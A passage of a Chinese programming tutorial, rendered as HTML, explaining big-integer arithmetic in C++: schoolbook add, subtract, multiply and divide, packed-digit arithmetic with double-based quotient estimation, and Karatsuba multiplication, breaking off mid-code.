class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">1004</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[LEN], b[LEN], c[LEN], d[LEN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] + b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">            c[i] -= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] - b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">            c[i] += <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; ++j) c[i] += a[j] * b[i - j];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">            c[i] %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">greater_eq</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> last_dg, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a[last_dg + len] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[last_dg + i] &gt; b[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[last_dg + i] &lt; b[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">div</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[], <span class="keyword">int</span> d[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line">    <span class="built_in">clear</span>(d);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> la, lb;</span><br><span class="line">    <span class="keyword">for</span> (la = LEN - <span class="number">1</span>; la &gt; <span class="number">0</span>; --la)</span><br><span class="line">        <span class="keyword">if</span> (a[la - <span class="number">1</span>] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (lb = LEN - <span class="number">1</span>; lb &gt; <span class="number">0</span>; --lb)</span><br><span class="line">        <span class="keyword">if</span> (b[lb - <span class="number">1</span>] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (lb == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&gt; &lt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; la; ++i) d[i] = a[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = la - lb; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">greater_eq</span>(d, b, i, lb)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; lb; ++j) &#123;</span><br><span class="line">                d[i + j] -= b[j];</span><br><span class="line">                <span class="keyword">if</span> (d[i + j] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    d[i + j + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">                    d[i + j] += <span class="number">10</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            c[i] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> op[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, op);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (op[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            <span class="built_in">add</span>(a, b, c);</span><br><span class="line">            <span class="built_in">print</span>(c);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="built_in">sub</span>(a, b, c);</span><br><span class="line">            <span class="built_in">print</span>(c);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            <span class="built_in">mul</span>(a, b, c);</span><br><span class="line">            <span class="built_in">print</span>(c);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="built_in">div</span>(a, b, c, d);</span><br><span class="line">            <span class="built_in">print</span>(c);</span><br><span class="line">            <span class="built_in">print</span>(d);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;&gt; &lt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="压位高精度"><a href="#压位高精度" class="headerlink" title="压位高精度"></a>压位高精度</h2><p>在一般的高精度加法，减法，乘法运算中，我们都是将参与运算的数拆分成一个个单独的数码进行运算。</p><p>例如计算 $8192\times 42$ 时，如果按照高精度乘高精度的计算方式，我们实际上算的是 $(8000+100+90+2)\times(40+2)$。</p><p>在位数较多的时候，拆分出的数也很多，高精度运算的效率就会下降。</p><p>有没有办法作出一些优化呢？</p><p>注意到拆分数字的方式并不影响最终的结果，因此我们可以将若干个数码进行合并。</p><p>还是以上面这个例子为例，如果我们每两位拆分一个数，我们可以拆分成 $(8100+92)\times 42$。</p><p>这样的拆分不影响最终结果，但是因为拆分出的数字变少了，计算效率也就提升了。</p><p>从 <a href="./base.md">进位制</a> 的角度理解这一过程，我们通过在较大的进位制（上面每两位拆分一个数，可以认为是在 $100$ 进制下进行运算）下进行运算，从而达到减少参与运算的数字的位数，提升运算效率的目的。</p><p>这就是 <strong>压位高精度</strong> 的思想。</p><p>下面我们给出压位高精度的加法代码，用于进一步阐述其实现方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里的 a,b,c 数组均为 p 进制下的数</span></span><br><span class="line"><span class="comment">// 最终输出答案时需要将数字转为十进制</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] + b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= p) &#123;  <span class="comment">// 在普通高精度运算下，p=10</span></span><br><span class="line">            c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">            c[i] -= p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="压位高精下的高效竖式除法"><a href="#压位高精下的高效竖式除法" class="headerlink" title="压位高精下的高效竖式除法"></a>压位高精下的高效竖式除法</h3><p>在使用压位高精时，如果试商时仍然使用上文介绍的方法，由于试商次数会很多，计算常数会非常大。例如在万进制下，平均每个位需要试商 5000 次，这个巨大的常数是不可接受的。因此我们需要一个更高效的试商办法。</p><p>我们可以把 double 作为媒介。假设被除数有 4 位，是 $a_4,a_3,a_2,a_1$，除数有 3 位，是 $b_3,b_2,b_1$，那么我们只要试一位的商：使用 $base$ 进制，用式子 $\dfrac{a_4 base + a_3}{b_3 + b_2 base^{-1} + (b_1+1)base^{-2}}$ 来估商。而对于多个位的情况，就是一位的写法加个循环。由于除数使用 3 位的精度来参与估商，能保证估的商 q’ 与实际商 q 的关系满足 $q-1 \le q’ \le q$，这样每个位在最坏的情况下也只需要两次试商。但与此同时要求 $base^3$ 在 double 的有效精度内，即 $base^3 &lt; 2^{53}$，所以在运用这个方法时建议不要超过 32768 进制，否则很容易因精度不足产生误差从而导致错误。</p><p>另外，由于估的商总是小于等于实际商，所以还有再进一步优化的空间。绝大多数情况下每个位只估商一次，这样在下一个位估商时，虽然得到的商有可能因为前一位的误差造成试商结果大于等于 base，但这没有关系，只要在最后再最后做统一进位便可。举个例子，假设 base 是 10，求 $395081/9876$，试商计算步骤如下：</p><ol><li>首先试商计算得到 $3950/988=3$，于是 $395081-(9876 \times 3 \times 10^1) = 98801$，这一步出现了误差，但不用管，继续下一步计算。</li><li>对余数 98801 继续试商计算得到 $9880/988=10$，于是 $98801-(9876 \times 10 \times 10^0) = 41$，这就是最终余数。</li><li>把试商过程的结果加起来并处理进位，即 $3 \times 10^1 + 10 \times 10^0 = 40$ 便是准确的商。</li></ol><p>方法虽然看着简单，但具体实现上很容易进坑，所以以下提供一个经过多番验证确认没有问题的实现供大家参考，要注意的细节也写在注释当中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 完整模板和实现 https://baobaobear.github.io/post/20210228-bigint1/</span></span><br><span class="line">    <span class="comment">// 对b乘以mul再左移offset的结果相减，为除法服务</span></span><br><span class="line"><span class="function">BigIntSimple &amp;<span class="title">sub_mul</span><span class="params">(<span class="keyword">const</span> BigIntSimple &amp;b, <span class="keyword">int</span> mul, <span class="keyword">int</span> offset)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mul == <span class="number">0</span>) <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">int</span> borrow = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 与减法不同的是，borrow可能很大，不能使用减法的写法</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; b.v.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        borrow += v[i + offset] - b.v[i] * mul - BIGINT_BASE + <span class="number">1</span>;</span><br><span class="line">        v[i + offset] = borrow % BIGINT_BASE + BIGINT_BASE - <span class="number">1</span>;</span><br><span class="line">        borrow /= BIGINT_BASE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果还有借位就继续处理</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = b.v.<span class="built_in">size</span>(); borrow; ++i) &#123;</span><br><span class="line">        borrow += v[i + offset] - BIGINT_BASE + <span class="number">1</span>;</span><br><span class="line">        v[i + offset] = borrow % BIGINT_BASE + BIGINT_BASE - <span class="number">1</span>;</span><br><span class="line">        borrow /= BIGINT_BASE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BigIntSimple <span class="title">div_mod</span><span class="params">(<span class="keyword">const</span> BigIntSimple &amp;b, BigIntSimple &amp;r)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    BigIntSimple d;</span><br><span class="line">    r = *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">absless</span>(b)) <span class="keyword">return</span> d;</span><br><span class="line">    d.v.<span class="built_in">resize</span>(v.<span class="built_in">size</span>() - b.v.<span class="built_in">size</span>() + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 提前算好除数的最高三位+1的倒数，若最高三位是a3,a2,a1</span></span><br><span class="line">    <span class="comment">// 那么db是a3+a2/base+(a1+1)/base^2的倒数，最后用乘法估商的每一位</span></span><br><span class="line">    <span class="comment">// 此法在BIGINT_BASE&lt;=32768时可在int32范围内用</span></span><br><span class="line">    <span class="comment">// 但即使使用int64，那么也只有BIGINT_BASE&lt;=131072时可用（受double的精度限制）</span></span><br><span class="line">    <span class="comment">// 能保证估计结果q&#x27;与实际结果q的关系满足q&#x27;&lt;=q&lt;=q&#x27;+1</span></span><br><span class="line">    <span class="comment">// 所以每一位的试商平均只需要一次，只要后面再统一处理进位即可</span></span><br><span class="line">    <span class="comment">// 如果要使用更大的base，那么需要更换其它试商方案</span></span><br><span class="line">    <span class="keyword">double</span> t = (b.<span class="built_in">get</span>((<span class="keyword">unsigned</span>)b.v.<span class="built_in">size</span>() - <span class="number">2</span>) +</span><br><span class="line">                (b.<span class="built_in">get</span>((<span class="keyword">unsigned</span>)b.v.<span class="built_in">size</span>() - <span class="number">3</span>) + <span class="number">1.0</span>) / BIGINT_BASE);</span><br><span class="line">    <span class="keyword">double</span> db = <span class="number">1.0</span> / (b.v.<span class="built_in">back</span>() + t / BIGINT_BASE);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = v.<span class="built_in">size</span>() - <span class="number">1</span>, j = d.v.<span class="built_in">size</span>() - <span class="number">1</span>; j &lt;= v.<span class="built_in">size</span>();) &#123;</span><br><span class="line">        <span class="keyword">int</span> rm = r.<span class="built_in">get</span>(i + <span class="number">1</span>) * BIGINT_BASE + r.<span class="built_in">get</span>(i);</span><br><span class="line">        <span class="keyword">int</span> m = std::<span class="built_in">max</span>((<span class="keyword">int</span>)(db * rm), r.<span class="built_in">get</span>(i + <span class="number">1</span>));</span><br><span class="line">        r.<span class="built_in">sub_mul</span>(b, m, j);</span><br><span class="line">        d.v[j] += m;</span><br><span class="line">        <span class="keyword">if</span> (!r.<span class="built_in">get</span>(i + <span class="number">1</span>))  <span class="comment">// 检查最高位是否已为0，避免极端情况</span></span><br><span class="line">            --i, --j;</span><br><span class="line">    &#125;</span><br><span class="line">    r.<span class="built_in">trim</span>();</span><br><span class="line">    <span class="comment">// 修正结果的个位</span></span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!r.<span class="built_in">absless</span>(b)) &#123;</span><br><span class="line">        r.<span class="built_in">subtract</span>(b);</span><br><span class="line">        ++carry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 修正每一位的进位</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; d.v.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        carry += d.v[i];</span><br><span class="line">        d.v[i] = carry % BIGINT_BASE;</span><br><span class="line">        carry /= BIGINT_BASE;</span><br><span class="line">    &#125;</span><br><span class="line">    d.<span class="built_in">trim</span>();</span><br><span class="line">    d.sign = sign * b.sign;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigIntSimple <span class="keyword">operator</span>/(<span class="keyword">const</span> BigIntSimple &amp;b) <span class="keyword">const</span> &#123;</span><br><span class="line">    BigIntSimple r;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">div_mod</span>(b, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigIntSimple <span class="keyword">operator</span>%(<span class="keyword">const</span> BigIntSimple &amp;b) <span class="keyword">const</span> &#123;</span><br><span class="line">    BigIntSimple r;</span><br><span class="line">    <span class="built_in">div_mod</span>(b, r);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Karatsuba-乘法"><a href="#Karatsuba-乘法" class="headerlink" title="Karatsuba 乘法"></a>Karatsuba 乘法</h2><p>记高精度数字的位数为 $n$，那么高精度—高精度竖式乘法需要花费 $O(n^2)$ 的时间。本节介绍一个时间复杂度更为优秀的算法，由前苏联（俄罗斯）数学家 Anatoly Karatsuba 提出，是一种分治算法。</p><p>考虑两个十进制大整数 $x$ 和 $y$，均包含 $n$ 个数码（可以有前导零）。任取 $0 &lt; m &lt; n$，记</p><p>$$<br>\begin{aligned}<br>x &amp;= x_1 \cdot 10^m + x_0, \<br>y &amp;= y_1 \cdot 10^m + y_0, \<br>x \cdot y &amp;= z_2 \cdot 10^{2m} + z_1 \cdot 10^m + z_0,<br>\end{aligned}<br>$$</p><p>其中 $x_0, y_0, z_0, z_1 &lt; 10^m$。可得</p><p>$$<br>\begin{aligned}<br>z_2 &amp;= x_1 \cdot y_1, \<br>z_1 &amp;= x_1 \cdot y_0 + x_0 \cdot y_1, \<br>z_0 &amp;= x_0 \cdot y_0.<br>\end{aligned}<br>$$</p><p>观察知</p><p>$$<br>z_1 = (x_1 + x_0) \cdot (y_1 + y_0) - z_2 - z_0,<br>$$</p><p>于是要计算 $z_1$，只需计算 $(x_1 + x_0) \cdot (y_1 + y_0)$，再与 $z_0$、$z_2$ 相减即可。</p><p>上式实际上是 Karatsuba 算法的核心，它将长度为 $n$ 的乘法问题转化为了 $3$ 个长度更小的子问题。若令 $m = \left\lceil \dfrac n 2 \right\rceil$，记 Karatsuba 算法计算两个 $n$ 位整数乘法的耗时为 $T(n)$，则有 $T(n) = 3 \cdot T \left(\left\lceil \dfrac n 2 \right\rceil\right) + O(n)$，由主定理可得 $T(n) = \Theta(n^{\log_2 3}) \approx \Theta(n^{1.585})$。</p><p>整个过程可以递归实现。为清晰起见，下面的代码通过 Karatsuba 算法实现了多项式乘法，最后再处理所有的进位问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">karatsuba_polymul</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="comment">// 规模较小时直接计算，避免继续递归带来的效率损失</span></span><br><span class="line">        <span class="keyword">int</span> *r = <span class="keyword">new</span> <span class="keyword">int</span>[n * <span class="number">2</span> + <span class="number">1</span>]();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; ++i)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= n; ++j) r[i + j] += a[i] * b[j];</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m = n / <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> *r = <span class="keyword">new</span> <span class="keyword">int</span>[m * <span class="number">4</span> + <span class="number">1</span>]();</span><br><span class="line">    <span class="keyword">int</span> *z0, *z1, *z2;</span><br><span class="line"></span><br><span class="line">    z0 = <span class="built_in">karatsuba_polymul</span>(m - <span class="number">1</span>, a, b);</span><br><span class="line">    z2 = <span class="built_in">karatsuba_polymul</span>(n - m, a + m, b + m);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 z1</span></span><br><span class="line">    <span class="comment">// 临时更改，计算完毕后恢复</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + m &lt;= n; ++i) a[i] += a[i + m];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + m &lt;= n; ++i) b[i] += b[i + m];</span><br><span class="line">    z1 = <span class="built_in">karatsuba_polymul</span>(m - <span class="number">1</span>, a, b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + m &lt;= n; ++i) a[i] -= a[i + m];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + m &lt;= n; ++i) b[i] -= b[i + m];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (m - <span class="number">1</span>) * <span class="number">2</span>; ++i) z1[i] -= z0[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (n - m) * <span class="number">2</span>; ++i) z1[i] -= z2[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由 z0、z1、z2 组合获得结果</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (m - <span class="number">1</span>) * <span class="number">2</span>; ++i) r[i] += z0[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (m - <span class="number">1</span>) * <span class="number">2</span>; ++i) r[i + m] += z1[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (n - m) * <span class="number">2</span>; ++i) r[i + m * <span class="number">2</span>] += z2[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] z0;</span><br><span class="line">    <span class="keyword">delete</span>[] z1;</span><br><span class="line">    <span class="keyword">delete</span>[] z2;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 